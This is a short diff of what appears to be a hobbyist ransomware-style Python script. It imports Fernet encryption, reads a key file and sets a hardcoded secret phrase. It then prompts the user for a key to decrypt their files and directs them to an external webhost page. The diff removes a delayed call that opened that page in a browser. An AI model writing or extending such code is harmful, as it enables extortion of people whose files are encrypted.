@@ -1,6 +1,4 @@
 import os
-import time
-import webbrowser as wb
 from cryptography.fernet import Fernet
 
 files=[]
@@ -46,9 +44,6 @@ with open("thekey.key", "rb") as key:
     secretkey = key.read()
 
 secretphrase = "coffee"
-
-time.sleep(7)
-wb.open("https://kunalmannuvoldemort.000webhostapp.com/")
 
 user_phase = input("Enter the secret key to decrypt your files\n & to get your secret key goto https://kunalmannuvoldemort.000webhostapp.com/ ") 
 
